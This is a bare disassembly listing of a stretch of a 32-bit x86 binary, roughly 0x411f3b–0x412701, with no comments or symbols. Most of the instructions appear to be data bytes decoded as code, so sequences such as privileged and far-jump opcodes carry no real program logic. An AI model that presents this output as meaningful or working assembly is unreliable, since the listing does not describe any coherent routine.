  411f3b:	adc    BYTE PTR [eax],al
  411f3d:	adc    BYTE PTR [edx],ah
  411f3f:	sbb    DWORD PTR [eax-0x771bdfee],eax
  411f45:	pusha  
  411f46:	push   ebx
  411f47:	test   DWORD PTR [esi+0x0],eax
  411f4a:	sbb    dl,ch
  411f4c:	adc    BYTE PTR [ecx+0x229900],0x11
  411f53:	lock adc BYTE PTR [esi],cl
  411f56:	mov    ds:0x24206068,al
  411f5b:	push   es
  411f5c:	add    BYTE PTR [ecx],al
  411f5e:	and    BYTE PTR [eax+0x47],al
  411f61:	add    BYTE PTR [eax+ecx*1],al
  411f64:	sbb    BYTE PTR [edx],bl
  411f66:	and    al,0x26
  411f68:	or     BYTE PTR [ecx],al
  411f6a:	xor    eax,0x4200204
  411f6f:	add    ah,BYTE PTR [eax]
  411f71:	add    BYTE PTR [ebx],0x1
  411f74:	add    DWORD PTR [eax],edx
  411f76:	pop    eax
  411f77:	lods   al,BYTE PTR ds:[esi]
  411f78:	sbb    BYTE PTR [eax+0x2302122b],0xc0
  411f7f:	les    ebp,FWORD PTR [ebx]
  411f81:	or     BYTE PTR [eax+0x70],bh
  411f84:	test   DWORD PTR [esp+eax*2],eax
  411f87:	mov    eax,0x522c0a05
  411f8c:	push   cs
  411f8d:	test   BYTE PTR [ecx+0x0],al
  411f90:	push   eax
  411f91:	inc    edx
  411f92:	ret    0x1084
  411f95:	test   eax,0x8210b24a
  411f9a:	leave  
  411f9b:	sbb    BYTE PTR [ecx+edx*4],al
  411f9e:	push   es
  411f9f:	add    eax,0x308210a
  411fa4:	jo     0x411fab
  411fa6:	call   DWORD PTR ds:0x4219f0
  411fac:	add    BYTE PTR [edx],ah
  411fae:	inc    eax
  411faf:	xor    BYTE PTR [eax+ecx*1+0x4a],al
  411fb3:	xchg   ecx,eax
  411fb4:	or     BYTE PTR [eax+0x205000c2],0x59
  411fbb:	adc    BYTE PTR [edx+0x4cb88140],dh
  411fc1:	add    BYTE PTR [eax],al
  411fc3:	and    al,0x4
  411fc5:	cmp    al,0x49
  411fc7:	dec    ecx
  411fc8:	mov    WORD PTR [eax],ss
  411fca:	add    BYTE PTR [esp],dl
  411fcd:	adc    al,BYTE PTR [edx]
  411fcf:	rol    BYTE PTR [eax],1
  411fd1:	add    DWORD PTR [ebx],edi
  411fd3:	push   ds
  411fd4:	add    BYTE PTR [esi],al
  411fd6:	or     cl,BYTE PTR [eax]
  411fd8:	push   es
  411fd9:	add    BYTE PTR [eax],ah
  411fdb:	inc    esi
  411fdc:	inc    eax
  411fdd:	and    DWORD PTR [eax],ecx
  411fdf:	add    DWORD PTR [edx],ecx
  411fe1:	inc    eax
  411fe2:	lds    eax,FWORD PTR ds:0x2646c4
  411fe8:	adc    dl,BYTE PTR [edx+0x4]
  411feb:	xchg   edx,eax
  411fec:	and    BYTE PTR [eax],ah
  411fee:	xor    al,0x2
  411ff0:	pop    es
  411ff1:	xor    BYTE PTR [ecx+0x42a09114],dh
  411ff7:	and    al,0x48
  411ff9:	add    al,BYTE PTR [edi]
  411ffb:	adc    BYTE PTR [ecx],dl
  411ffd:	add    al,0x60
  411fff:	adc    DWORD PTR [ecx],ebx
  412001:	adc    al,0xb
  412003:	add    DWORD PTR [edx],eax
  412005:	dec    eax
  412006:	and    al,0x0
  412008:	leave  
  412009:	xor    BYTE PTR [edx-0x77],0x84
  41200d:	and    BYTE PTR [eax],ah
  41200f:	loopne 0x41202a
  412011:	shl    BYTE PTR [eax+0x2c8025c2],0xb6
  412018:	adc    BYTE PTR [eax+ecx*4],cl
  41201b:	add    BYTE PTR [eax+ecx*4],dh
  41201e:	add    dh,BYTE PTR ds:0x144301
  412024:	add    BYTE PTR [ecx],cl
  412026:	add    BYTE PTR [edx+0x1221],dl
  41202c:	add    DWORD PTR [esi+0x1],0x14901804
  412033:	push   ebp
  412034:	add    eax,0xa0002020
  412039:	sbb    BYTE PTR [ecx],cl
  41203b:	add    al,BYTE PTR [ebp+0x19050a8]
  412041:	adc    BYTE PTR [eax],al
  412043:	add    DWORD PTR [eax+0x44],eax
  412046:	sub    DWORD PTR [eax+0xd008890],edx
  41204c:	add    BYTE PTR [eax],dl
  41204e:	xchg   esp,eax
  41204f:	and    BYTE PTR [edx],al
  412051:	push   0x9224165
  412056:	rol    DWORD PTR [eax],0x40
  412059:	dec    esp
  41205a:	or     BYTE PTR [ebx+0x4200a0f0],0x80
  412061:	dec    ebp
  412062:	add    BYTE PTR [eax],0x10
  412065:	sbb    BYTE PTR ds:0x408e108,al
  41206b:	shr    BYTE PTR [edx+0x14a2692],1
  412071:	add    BYTE PTR fs:[ebp+0x0],ah
  412075:	add    eax,0x8470c013
  41207a:	add    al,0x91
  41207c:	push   es
  41207d:	sub    dl,al
  41207f:	inc    esp
  412080:	add    ch,BYTE PTR [eax]
  412082:	add    BYTE PTR [eax+0x4010182],al
  412088:	inc    esi
  412089:	add    BYTE PTR [eax],bl
  41208b:	xchg   edx,eax
  41208c:	add    BYTE PTR [edx],ah
  41208e:	add    al,BYTE PTR [eax]
  412090:	mov    eax,ds:0xa1302084
  412095:	mov    es,WORD PTR [eax]
  412097:	or     BYTE PTR [eax+0x65315009],0x5
  41209e:	mov    al,ds:0x70494
  4120a3:	inc    esp
  4120a4:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a6:	add    BYTE PTR [ebp+0x0],dl
  4120a9:	or     edx,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [eax+eax*4],al
  4120ae:	add    BYTE PTR [eax*1+0x3a1],al
  4120b5:	sub    DWORD PTR [ecx-0x7e],esp
  4120b8:	push   ss
  4120b9:	add    DWORD PTR [ecx-0x80],ecx
  4120bc:	or     al,0x41
  4120be:	pusha  
  4120bf:	add    al,BYTE PTR fs:[eax+edx*1]
  4120c3:	and    BYTE PTR [eax+eax*1],al
  4120c6:	gs add eax,0x40670248
  4120cc:	and    al,0xa0
  4120ce:	xchg   ecx,eax
  4120cf:	and    al,0x41
  4120d1:	pop    esi
  4120d2:	add    BYTE PTR [ecx+0x30],ah
  4120d5:	inc    eax
  4120d6:	add    al,0xa3
  4120d8:	cwde   
  4120d9:	or     dl,BYTE PTR [eax+0x4100920]
  4120df:	add    BYTE PTR [eax+0xa],ch
  4120e2:	rol    BYTE PTR [edx+eax*2],1
  4120e5:	pusha  
  4120e6:	and    al,0x82
  4120e8:	inc    esp
  4120e9:	adc    BYTE PTR [eax],cl
  4120eb:	inc    eax
  4120ec:	add    BYTE PTR [eax],al
  4120ee:	add    edx,DWORD PTR [edx+0x3]
  4120f1:	es and al,0x2e
  4120f4:	inc    eax
  4120f5:	adc    dl,BYTE PTR [eax+0x30]
  4120f8:	cwde   
  4120f9:	add    DWORD PTR [edx],esi
  4120fb:	nop
  4120fc:	sub    DWORD PTR [ebx+0x244c438],edx
  412102:	cwde   
  412103:	add    BYTE PTR [edx],0x6a
  412106:	push   edx
  412107:	or     BYTE PTR [edx],dl
  412109:	inc    eax
  41210a:	sbb    cl,BYTE PTR [ecx]
  41210c:	or     BYTE PTR [eax+0x42],0xd8
  412110:	add    cl,BYTE PTR [ebx+eax*2+0x16]
  412114:	and    BYTE PTR [edx],al
  412116:	add    al,0xc0
  412118:	xor    BYTE PTR [edx+0x9],al
  41211b:	mov    BYTE PTR [eax],cl
  41211d:	add    BYTE PTR [ecx],ah
  41211f:	add    BYTE PTR [eax],al
  412121:	inc    eax
  412122:	rol    BYTE PTR [ecx],0xc
  412125:	add    al,0x0
  412127:	mov    DWORD PTR [esp+ebp*1+0x8],eax
  41212b:	sbb    BYTE PTR [ebx+0x46a1c18],al
  412131:	retf   
  412132:	sub    BYTE PTR [eax],cl
  412134:	mov    BYTE PTR ds:0xa00188,cl
  41213a:	pop    eax
  41213b:	inc    edx
  41213c:	add    al,0x0
  41213e:	inc    eax
  41213f:	add    cl,BYTE PTR [eax]
  412141:	dec    ebp
  412142:	add    ah,BYTE PTR [esi]
  412144:	pop    es
  412145:	inc    esp
  412146:	or     BYTE PTR [edx],ah
  412148:	or     BYTE PTR [edx],dl
  41214a:	add    BYTE PTR ds:0x20920013,al
  412150:	add    BYTE PTR [eax],0x4
  412153:	add    eax,0x200010d5
  412158:	inc    ebp
  412159:	and    DWORD PTR [eax],ecx
  41215b:	adc    BYTE PTR [esi],cl
  41215d:	add    BYTE PTR [eax],dl
  41215f:	cwde   
  412160:	xchg   esp,eax
  412161:	add    al,0x49
  412163:	or     edx,eax
  412165:	add    BYTE PTR [eax+0x20042],al
  41216b:	add    al,0x1
  41216d:	adc    BYTE PTR ds:0xc104a00,ah
  412173:	and    BYTE PTR [eax+ecx*4],0x8
  412177:	adc    al,0x94
  412179:	xor    eax,0x8168c1a2
  41217e:	mov    al,0x1
  412180:	push   eax
  412181:	and    edx,DWORD PTR [eax+0x41]
  412184:	or     dh,0x16
  412187:	add    dl,BYTE PTR [eax]
  412189:	add    BYTE PTR cs:[ecx],0x34
  41218d:	dec    ecx
  41218e:	adc    al,0x40
  412190:	mov    BYTE PTR [eax+0x45],cl
  412193:	push   eax
  412194:	or     BYTE PTR [eax+eiz*1],dl
  412197:	pushf  
  412198:	nop
  412199:	xchg   DWORD PTR [ecx],esp
  41219b:	xor    BYTE PTR [eax],al
  41219d:	dec    eax
  41219e:	add    ecx,DWORD PTR [edx]
  4121a0:	lods   al,BYTE PTR ds:[esi]
  4121a1:	or     al,0x0
  4121a3:	add    DWORD PTR [eax],ecx
  4121a5:	and    ch,BYTE PTR [ebx]
  4121a7:	add    BYTE PTR [ecx-0x56c7fc00],al
  4121ad:	add    DWORD PTR [eax+eax*8],ebx
  4121b0:	adc    al,BYTE PTR [ecx+0xa280207]
  4121b6:	nop
  4121b7:	and    al,0x0
  4121b9:	popa   
  4121ba:	add    DWORD PTR [ecx],eax
  4121bc:	add    DWORD PTR [eax+ecx*2],eax
  4121bf:	or     BYTE PTR [ecx],al
  4121c1:	inc    eax
  4121c2:	add    al,0x0
  4121c5:	inc    esi
  4121c6:	call   0x8070:0x14829144
  4121cd:	add    DWORD PTR [eax],0x8b0c140
  4121d3:	jo     0x4121f6
  4121d5:	inc    eax
  4121d6:	adc    DWORD PTR [ecx],0x65120409
  4121dc:	add    BYTE PTR [eax-0x7d],al
  4121df:	loopne 0x41217b
  4121e1:	or     al,0x48
  4121e3:	inc    ecx
  4121e4:	dec    edx
  4121e5:	and    dl,BYTE PTR [esi+ebx*1]
  4121e8:	mov    DWORD PTR [esi],eax
  4121ea:	mov    BYTE PTR [eax],cl
  4121ec:	das    
  4121ed:	add    al,BYTE PTR [eax]
  4121ef:	push   ebp
  4121f0:	inc    eax
  4121f1:	add    ecx,esp
  4121f3:	or     eax,0x85f1c04
  4121f8:	les    ecx,FWORD PTR [eax+0x40]
  4121fb:	adc    BYTE PTR [esi],cl
  4121fd:	adc    ah,BYTE PTR [eax+eiz*1]
  412200:	mov    BYTE PTR [ebp+0x5291502],al
  412206:	xor    DWORD PTR [eax],edi
  412208:	clts   
  41220a:	add    cl,BYTE PTR [edx]
  41220c:	adc    DWORD PTR [ecx+0x26002528],eax
  412212:	or     al,0x63
  412214:	pusha  
  412215:	call   0x8c634a6
  41221a:	and    eax,0x80040680
  41221f:	mov    ds:0x20244280,al
  412224:	or     DWORD PTR [eax],eax
  412226:	and    eax,0x18420490
  41222b:	inc    eax
  41222c:	enter  0x22,0x4
  412230:	push   eax
  412231:	jnp    0x412233
  412233:	mov    al,ds:0x11867820
  412238:	test   DWORD PTR [esp+eax*1+0x2],eax
  41223c:	popa   
  41223d:	and    BYTE PTR [eax],dl
  41223f:	jo     0x41228e
  412241:	xchg   edx,eax
  412242:	mov    DWORD PTR [edx],edx
  412244:	push   edx
  412245:	cmp    eax,0x28d84c00
  41224a:	and    al,BYTE PTR [ebx]
  41224c:	add    al,0x1
  41224e:	add    BYTE PTR [ebp+0x6],0x60
  412252:	or     DWORD PTR [ecx],esp
  412254:	test   DWORD PTR [eax+0x31],ecx
  412257:	add    BYTE PTR [ecx+0x19],0x6
  41225b:	add    eax,0x70802
  412260:	or     DWORD PTR [eax+edx*1],edx
  412263:	or     eax,eax
  412265:	dec    eax
  412266:	xor    al,0x71
  412268:	ror    BYTE PTR [eax],0x47
  41226b:	adc    eax,DWORD PTR [esp+eax*1+0x7a]
  41226f:	add    BYTE PTR [esi],0x48
  412272:	push   edi
  412273:	sub    DWORD PTR [eax-0x45fbde00],edx
  412279:	add    BYTE PTR [eax-0x62fe76fe],al
  41227f:	add    al,BYTE PTR [edx]
  412281:	add    DWORD PTR [eax],eax
  412283:	and    BYTE PTR [eax+0x2881d82],al
  412289:	add    BYTE PTR [edx],ah
  41228b:	or     al,BYTE PTR [eax+eax*1]
  41228e:	sub    eax,0x28014000
  412293:	cmp    BYTE PTR [eax+0xa02d200],cl
  412299:	adc    dl,BYTE PTR [eax]
  41229b:	add    DWORD PTR [ebp+0x406508ca],esp
  4122a1:	pop    ecx
  4122a2:	adc    BYTE PTR [eax],cl
  4122a4:	push   es
  4122a5:	inc    eax
  4122a6:	add    BYTE PTR ds:0x149012e8,ah
  4122ac:	inc    esp
  4122ad:	mov    eax,ds:0x14150012
  4122b2:	add    DWORD PTR [ecx],edx
  4122b4:	inc    ecx
  4122b5:	call   0x42192644
  4122ba:	bound  eax,QWORD PTR ds:0x40100281
  4122c0:	add    al,0x28
  4122c2:	add    BYTE PTR [esi],al
  4122c4:	mov    WORD PTR [edi+0x19],es
  4122c7:	mov    BYTE PTR [eax],ah
  4122c9:	inc    eax
  4122ca:	add    BYTE PTR [eax],al
  4122cc:	rol    BYTE PTR [eax+0x48],0xc0
  4122d0:	or     ah,BYTE PTR [eax]
  4122d2:	add    cl,BYTE PTR [edx]
  4122d4:	inc    ebx
  4122d5:	add    BYTE PTR [esi],ah
  4122d7:	add    al,BYTE PTR [eax+0xa]
  4122da:	pusha  
  4122db:	add    al,0x95
  4122dd:	nop
  4122de:	add    al,0x10
  4122e0:	dec    ebp
  4122e1:	test   al,0x0
  4122e3:	and    BYTE PTR [eax],0xa2
  4122e6:	pop    ebp
  4122e7:	mov    es,WORD PTR [edx+0x14848]
  4122ed:	enter  0x8880,0x40
  4122f1:	add    DWORD PTR [eax],edx
  4122f3:	or     BYTE PTR [edi+0x284080e8],al
  4122f9:	add    al,0xa0
  4122fb:	add    BYTE PTR [eax],0x2
  4122fe:	loope  0x412310
  412300:	inc    edx
  412301:	mov    BYTE PTR [ecx],cl
  412303:	or     BYTE PTR [eax+0x69],al
  412306:	inc    eax
  412307:	pop    DWORD PTR [edx+edx*2]
  41230a:	inc    esi
  41230b:	mov    fs,WORD PTR [ecx]
  41230d:	test   BYTE PTR [ecx],dh
  41230f:	or     al,0x44
  412311:	or     DWORD PTR [ecx+0x74],eax
  412314:	and    al,BYTE PTR [eax+0xa803114]
  41231a:	sbb    al,0xc
  41231c:	add    ah,BYTE PTR [edx+0x40220004]
  412322:	nop
  412323:	add    BYTE PTR [ecx+eax*1],al
  412326:	dec    esp
  412327:	mov    al,0x4b
  412329:	add    BYTE PTR [eax+0x30],al
  41232c:	inc    edx
  41232d:	add    BYTE PTR [eax],ah
  41232f:	mov    al,ds:0x2221e60
  412334:	nop
  412335:	or     BYTE PTR [eax],dh
  412337:	adc    eax,0x124a1080
  41233c:	add    esp,DWORD PTR [ebx]
  41233e:	add    BYTE PTR [edx+0x10],0x54
  412342:	xor    al,0x98
  412344:	add    DWORD PTR [ecx],edx
  412346:	and    al,0x16
  412348:	add    al,0x0
  41234a:	imul   esp,DWORD PTR [eax],0xffffff88
  41234d:	add    BYTE PTR [eax],bl
  41234f:	inc    eax
  412350:	sbb    dl,BYTE PTR [ebp+0x68]
  412353:	and    DWORD PTR [eax],edx
  412355:	sbb    DWORD PTR ds:0x10451083,ecx
  41235b:	loopne 0x41239f
  41235d:	and    DWORD PTR [edx],ecx
  41235f:	xor    al,0xa
  412361:	and    esp,ecx
  412363:	mov    eax,ds:0x87024e1
  412368:	add    BYTE PTR [eax+0x4c160060],dl
  41236e:	add    ah,al
  412370:	mov    ch,0x4
  412372:	inc    edx
  412373:	add    BYTE PTR [eax],al
  412375:	shl    BYTE PTR [edx-0x80],0x11
  412379:	push   es
  41237a:	inc    esp
  41237b:	or     eax,eax
  41237d:	and    al,0xd0
  41237f:	and    BYTE PTR [eax],0xaa
  412382:	add    DWORD PTR [ebx-0x5e],ecx
  412385:	or     DWORD PTR [edx],0x180000e0
  41238b:	shr    BYTE PTR [eax+eiz*1],0x80
  41238f:	sbb    al,BYTE PTR [ecx]
  412391:	add    BYTE PTR [eax-0x48],ah
  412394:	add    DWORD PTR [eax],esi
  412396:	or     ebp,0x41
  412399:	pop    ss
  41239a:	push   edx
  41239b:	add    esi,DWORD PTR [eax]
  41239d:	inc    eax
  41239e:	cwde   
  41239f:	sub    DWORD PTR [edx+0x7],esp
  4123a2:	sbb    eax,DWORD PTR [esi+0x0]
  4123a5:	adc    al,0xa2
  4123a7:	push   edx
  4123a8:	push   eax
  4123a9:	add    BYTE PTR [eax+ebx*1+0x1a5c0828],ah
  4123b0:	add    BYTE PTR [eax-0x72],al
  4123b3:	or     eax,DWORD PTR [eax+0x5]
  4123b6:	add    DWORD PTR [ecx+0x20d21a42],eax
  4123bc:	push   eax
  4123bd:	or     DWORD PTR [esi+0x20],esp
  4123c0:	mov    eax,DWORD PTR [eax+0x4a]
  4123c3:	or     DWORD PTR [ecx],esp
  4123c5:	or     DWORD PTR [eax-0x7c],eax
  4123c8:	inc    ecx
  4123c9:	add    al,0x43
  4123cb:	inc    edx
  4123cc:	adc    BYTE PTR [eax],0x15
  4123cf:	jecxz  0x4123d2
  4123d1:	add    BYTE PTR [ebx],dl
  4123d3:	add    al,BYTE PTR [ebx]
  4123d5:	add    BYTE PTR [eax+0x14362003],ah
  4123db:	and    DWORD PTR [esp+0x20030280],ecx
  4123e2:	or     dh,BYTE PTR [edx]
  4123e4:	add    DWORD PTR [ecx],eax
  4123e6:	sub    al,BYTE PTR [edi]
  4123e8:	add    BYTE PTR [ecx],al
  4123ea:	pop    es
  4123eb:	inc    edx
  4123ec:	add    DWORD PTR [eax+eiz*1+0xa6d2b35],edx
  4123f3:	push   0x4430014b
  4123f8:	or     al,0xa8
  4123fa:	or     dl,al
  4123fc:	add    al,ah
  4123fe:	pusha  
  4123ff:	xor    BYTE PTR [eax],al
  412401:	add    DWORD PTR [ecx],0xc0004084
  412407:	or     BYTE PTR [esi],ah
  412409:	ins    BYTE PTR es:[edi],dx
  41240a:	adc    BYTE PTR [ebx],dl
  41240c:	pusha  
  41240d:	mov    eax,ds:0x804080a
  412412:	bound  eax,QWORD PTR [ebp+0x1c000229]
  412418:	dec    esi
  412419:	or     al,0x80
  41241b:	add    DWORD PTR ds:0x45200d10,eax
  412421:	add    BYTE PTR [eax+0x20274ad],ch
  412427:	and    BYTE PTR [esi],0x8
  41242a:	add    BYTE PTR [edx],dl
  41242c:	and    al,0xa2
  41242e:	add    al,al
  412430:	or     BYTE PTR [ecx],dl
  412432:	add    BYTE PTR [eax],0x44
  412435:	add    BYTE PTR [eax+0xc01414],cl
  41243b:	js     0x412463
  41243d:	adc    BYTE PTR [esi-0xfed3d60],0x54
  412444:	add    BYTE PTR [eax+eax*2-0x597cd7fe],0x10
  41244c:	or     al,0x2c
  41244e:	mov    al,0x0
  412450:	enter  0x4002,0x7
  412454:	xor    al,0x45
  412456:	xchg   BYTE PTR [edx],al
  412458:	inc    esi
  412459:	mov    al,ds:0x872853
  41245e:	xchg   ebx,eax
  41245f:	jecxz  0x412461
  412461:	and    BYTE PTR [esp+eax*4],al
  412464:	or     DWORD PTR [ecx],eax
  412466:	add    ah,BYTE PTR [eax]
  412468:	or     eax,0xa0241240
  41246d:	push   ecx
  41246e:	test   al,0xc1
  412470:	sub    al,BYTE PTR [ebx+0x14]
  412473:	add    DWORD PTR [esp+esi*1-0x80],eax
  412477:	inc    eax
  412478:	inc    edx
  412479:	inc    edx
  41247a:	xchg   ebx,eax
  41247b:	push   es
  41247c:	sbb    al,BYTE PTR [ecx-0x7fff9b00]
  412482:	add    BYTE PTR [eax-0x74],al
  412485:	inc    edx
  412486:	test   al,al
  412488:	or     BYTE PTR [edx+eax*1],al
  41248b:	pop    es
  41248c:	add    DWORD PTR [eax],eax
  41248e:	and    BYTE PTR [ecx+0x2],0x80
  412492:	add    al,BYTE PTR [edx+0x82480a]
  412498:	sbb    dl,al
  41249a:	add    al,0x10
  41249c:	add    BYTE PTR [eax],al
  41249e:	and    DWORD PTR [ecx+0x41268380],0x90a00
  4124a8:	add    BYTE PTR [eax],ah
  4124aa:	mov    WORD PTR [eax],es
  4124ac:	add    DWORD PTR [eax],esi
  4124ae:	add    al,0x0
  4124b0:	add    BYTE PTR [esi],dl
  4124b2:	add    DWORD PTR [edx+edx*8],eax
  4124b5:	sub    al,0x10
  4124b7:	mov    cl,dl
  4124b9:	add    al,BYTE PTR [eax-0x7ffb8000]
  4124bf:	test   BYTE PTR [eax+eiz*1+0x44301ec0],al
  4124c6:	or     BYTE PTR [eax+0x68],0x2c
  4124ca:	add    BYTE PTR [eax],al
  4124cc:	inc    edx
  4124cd:	test   BYTE PTR [eax+0x19],ah
  4124d0:	mov    BYTE PTR [eax],dl
  4124d2:	add    ch,BYTE PTR [esp+ecx*2-0x70]
  4124d6:	or     DWORD PTR [ecx],ebp
  4124d8:	mov    ah,BYTE PTR [eax-0x80]
  4124db:	add    BYTE PTR [edx+ecx*2+0x5dba811c],dl
  4124e2:	enter  0x840,0x25
  4124e6:	add    al,BYTE PTR [ebp+0x34400810]
  4124ec:	xchg   edx,eax
  4124ed:	and    al,dh
  4124ef:	or     BYTE PTR ss:[eax],cl
  4124f2:	adc    BYTE PTR [eax+0x10],al
  4124f5:	js     0x41251b
  4124f7:	xchg   edx,eax
  4124f8:	ins    BYTE PTR es:[edi],dx
  4124f9:	sub    eax,0x2000d1a0
  4124fe:	inc    ecx
  4124ff:	add    BYTE PTR [ebx],al
  412501:	add    al,BYTE PTR [ecx]
  412503:	test   al,0x2
  412505:	dec    eax
  412506:	or     BYTE PTR [eax],0x91
  412509:	xchg   ecx,eax
  41250a:	rcl    BYTE PTR [eax],cl
  41250c:	add    BYTE PTR [eax+0x48],cl
  41250f:	add    BYTE PTR [ecx],al
  412511:	pop    edx
  412512:	add    al,dl
  412514:	inc    eax
  412515:	cdq    
  412516:	adc    al,0x28
  412518:	add    DWORD PTR [eax],ecx
  41251a:	dec    eax
  41251b:	add    DWORD PTR [ebp-0x76fbbafe],edx
  412521:	adc    BYTE PTR [ecx],ah
  412523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412524:	mov    al,BYTE PTR [edx+0x12180680]
  41252a:	inc    edx
  41252b:	inc    ecx
  41252c:	and    BYTE PTR [edi+0x47af0044],dh
  412532:	add    esi,DWORD PTR [edx]
  412534:	or     al,0x0
  412536:	and    BYTE PTR [eax],dh
  412538:	adc    BYTE PTR [edx],al
  41253a:	push   0x4408071d
  41253f:	add    BYTE PTR [eax],al
  412541:	dec    eax
  412542:	sbb    BYTE PTR [ecx],0xa
  412545:	add    al,dl
  412547:	pop    ebx
  412548:	add    BYTE PTR [edx],al
  41254a:	or     DWORD PTR [ecx+0x1080a41],eax
  412550:	add    DWORD PTR [eax],esp
  412552:	add    al,BYTE PTR [esp+eiz*4]
  412555:	add    DWORD PTR [ecx],edx
  412557:	scas   eax,DWORD PTR es:[edi]
  412558:	adc    BYTE PTR [ebx+0x20],al
  41255b:	xchg   BYTE PTR [ebx+0x2],ch
  41255e:	and    al,0x1
  412560:	mov    eax,ds:0x388010a4
  412565:	add    BYTE PTR [ebp+0x14104f20],cl
  41256b:	les    eax,FWORD PTR [ecx]
  41256d:	inc    eax
  41256e:	and    BYTE PTR [eax],al
  412570:	mov    BYTE PTR [eax+0x5a520012],al
  412576:	imul   eax,DWORD PTR [eax+0x2],0x200
  41257d:	loope  0x41258f
  41257f:	push   es
  412580:	inc    eax
  412581:	jp     0x412505
  412583:	xor    DWORD PTR [eax+eax*1],ecx
  412586:	add    DWORD PTR [eax+0x1b804a0],esp
  41258c:	and    cl,BYTE PTR [esi]
  41258e:	inc    ecx
  41258f:	or     BYTE PTR [edx],ah
  412591:	adc    DWORD PTR [edx+0x29063981],eax
  412597:	mov    eax,ds:0x804d0000
  41259c:	add    BYTE PTR [eax],0x8
  41259f:	test   BYTE PTR [eax+0xc],al
  4125a2:	xor    DWORD PTR [ecx-0x20],esp
  4125a5:	or     al,0x83
  4125a7:	add    BYTE PTR [edx-0x7dff2b6b],cl
  4125ad:	inc    esp
  4125ae:	fsub   DWORD PTR [edx+0x78280580]
  4125b4:	add    BYTE PTR [ecx+edx*1],dl
  4125b7:	icebp  
  4125b8:	cwde   
  4125b9:	add    BYTE PTR [ecx],ah
  4125bb:	add    DWORD PTR [edx],0x77600020
  4125c1:	and    bl,BYTE PTR [ecx]
  4125c3:	cmp    BYTE PTR [esi+0x59],al
  4125c6:	sbb    BYTE PTR [eax],ah
  4125c8:	sub    BYTE PTR [edi],bl
  4125ca:	or     al,BYTE PTR ds:0x544a6870
  4125d0:	push   edi
  4125d1:	test   BYTE PTR [eax+eiz*2],al
  4125d4:	pop    edx
  4125d5:	adc    DWORD PTR ds:0x1439ab0,0x3800040
  4125df:	adc    al,0x40
  4125e1:	push   es
  4125e2:	inc    edx
  4125e3:	sbb    BYTE PTR [esi+0x60],dl
  4125e6:	rol    BYTE PTR [eax-0x20],0x0
  4125ea:	xor    eax,DWORD PTR [eax]
  4125ec:	sbb    esi,ecx
  4125ee:	sbb    ah,BYTE PTR ds:0x3802b029
  4125f4:	mov    al,ds:0x8c070ac8
  4125f9:	adc    BYTE PTR [ecx],dl
  4125fb:	add    cl,BYTE PTR [eax+0x20810922]
  412601:	and    BYTE PTR [eax-0x2ddffdc8],al
  412607:	and    DWORD PTR [edx+0x48088],edx
  41260d:	inc    ebp
  41260e:	dec    esp
  41260f:	xor    esp,DWORD PTR ds:0x30d0280
  412615:	or     al,BYTE PTR [eax]
  412617:	and    BYTE PTR [ecx],cl
  412619:	ret    0x2341
  41261c:	add    al,BYTE PTR [ecx]
  41261e:	add    al,0x80
  412620:	add    BYTE PTR [eax+0xd040801],al
  412626:	inc    ebx
  412627:	jmp    0x504:0x1404811c
  41262e:	inc    eax
  41262f:	and    al,BYTE PTR [eax+0x69d20012]
  412635:	dec    edx
  412636:	inc    eax
  412637:	or     al,0x8a
  412639:	or     BYTE PTR [eax],0x18
  41263c:	nop
  41263d:	xor    BYTE PTR [eax],cl
  41263f:	or     al,0x21
  412641:	ror    BYTE PTR [ecx],1
  412643:	inc    eax
  412644:	inc    esp
  412645:	and    BYTE PTR [eax+0x8],al
  412648:	mov    WORD PTR [ebp+0xa],ss
  41264b:	add    BYTE PTR [ecx],ah
  41264d:	inc    eax
  41264e:	fcmovb st,st(0)
  412650:	add    dl,dh
  412652:	ror    BYTE PTR [edx+0x34],0x24
  412656:	inc    eax
  412657:	inc    eax
  412658:	add    al,BYTE PTR [edx+edx*1]
  41265b:	mov    al,ds:0x8a5c2184
  412660:	aam    0x3c
  412662:	add    BYTE PTR [edx],al
  412664:	add    al,0x0
  412666:	or     ah,BYTE PTR [eax]
  412668:	add    DWORD PTR [eax],ecx
  41266a:	push   0x2444503a
  41266f:	add    DWORD PTR [esp+edx*1],ecx
  412672:	add    BYTE PTR [edx],al
  412674:	mov    WORD PTR [eax+0x29],ss
  412677:	inc    edx
  412678:	adc    BYTE PTR [edx+0x22],ah
  41267b:	add    BYTE PTR [eax+0x2030200],cl
  412681:	xchg   ecx,eax
  412682:	pop    eax
  412683:	add    BYTE PTR [eax],cl
  412685:	add    ch,BYTE PTR [ebx]
  412687:	inc    eax
  412688:	add    BYTE PTR [edx+ecx*2-0x50],cl
  41268c:	cwde   
  41268d:	add    ah,BYTE PTR [ecx+0x2]
  412690:	or     BYTE PTR [eax],0x0
  412693:	lock add BYTE PTR [eax],bl
  412696:	add    DWORD PTR [edx],eax
  412698:	push   edx
  412699:	nop
  41269a:	sub    BYTE PTR [esp+eiz*8+0x15],al
  41269e:	inc    ecx
  41269f:	add    BYTE PTR [ecx],al
  4126a1:	jno    0x412663
  4126a3:	mov    edx,0xc0a00c21
  4126a8:	push   cs
  4126a9:	and    cl,al
  4126ab:	or     BYTE PTR [edx+0x14],al
  4126ae:	sbb    cl,cl
  4126b0:	adc    al,0x5
  4126b2:	add    BYTE PTR [eax],0x0
  4126b5:	sbb    BYTE PTR [eax+eax*2],bl
  4126b8:	and    BYTE PTR ds:0x84198000,cl
  4126be:	or     al,BYTE PTR [eax]
  4126c0:	sub    BYTE PTR [eax],ch
  4126c2:	adc    BYTE PTR [edx+ebp*1+0x21],al
  4126c6:	xchg   ebx,eax
  4126c7:	and    eax,0x61482005
  4126cc:	adc    eax,DWORD PTR [eax]
  4126ce:	add    eax,0x816e013
  4126d3:	mov    DWORD PTR [ebx],ecx
  4126d5:	add    DWORD PTR [ecx+0x1],ecx
  4126d8:	and    ecx,ebx
  4126da:	pop    ss
  4126db:	add    al,0x0
  4126dd:	add    BYTE PTR [eax],cl
  4126df:	call   0x2044:0x4881cd00
  4126e6:	push   ss
  4126e7:	add    DWORD PTR [edi],eax
  4126e9:	mov    al,ds:0x81590128
  4126ee:	xor    BYTE PTR [ecx+eax*1],0x28
  4126f2:	adc    ecx,DWORD PTR [eax]
  4126f4:	sbb    BYTE PTR [ebx+ebp*4],al
  4126f7:	add    al,dh
  4126f9:	sbb    dh,BYTE PTR [eax+esi*1+0x60]
  4126fd:	adc    BYTE PTR [eax],cl
  4126ff:	add    al,0x0
  412701:	adc    BYTE PTR fs:[eax],al
